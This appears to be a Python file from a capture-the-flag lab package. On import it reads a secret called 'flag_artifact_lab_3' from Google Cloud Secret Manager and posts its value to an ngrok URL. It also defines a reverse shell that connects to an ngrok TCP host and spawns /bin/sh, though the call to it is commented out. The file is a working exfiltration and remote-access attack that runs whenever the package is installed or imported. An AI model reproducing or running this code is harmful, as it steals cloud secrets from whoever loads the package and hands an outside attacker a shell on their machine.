# artifact_lab_3_package_6e10193e/flag.py
import os
import socket
import subprocess
import requests
from google.cloud import secretmanager

def send_metadata(data):
    print("Attempting to send metadata from flag.py...")
    url = "https://b889-67-205-141-215.ngrok-free.app/log"  # URL ngrok fornecida

    # Enviar os dados para o servidor
    try:
        response = requests.post(url, data={"secret": data})
        print(f"Server responded with status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send metadata: {e}, details: {e.__class__.__name__}: {str(e)}")

def access_secret_version(project_id, secret_id, version_id="latest"):
    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the secret version.
    name = f"projects/{project_id}/secrets/{secret_id}/versions/{version_id}"

    # Access the secret version.
    response = client.access_secret_version(name=name)
    
    # Extract the secret payload.
    secret_payload = response.payload.data.decode("UTF-8")
    return secret_payload

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("8.tcp.ngrok.io", 14060))  # Substitua com o seu host e porta do ngrok
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

def hello():
    print("Hello, World!")

# Tenta acessar o Secret Manager e enviar o conteúdo
try:
    project_id = os.getenv('GOOGLE_CLOUD_PROJECT')  # Captura o ID do projeto
    secret_id = "flag_artifact_lab_3"
    secret_value = access_secret_version(project_id, secret_id)
    send_metadata(secret_value)
except Exception as e:
    print(f"Failed to access Secret Manager: {e}")

# Opcionalmente, também execute a shell reversa ao executar este script
# reverse_shell()

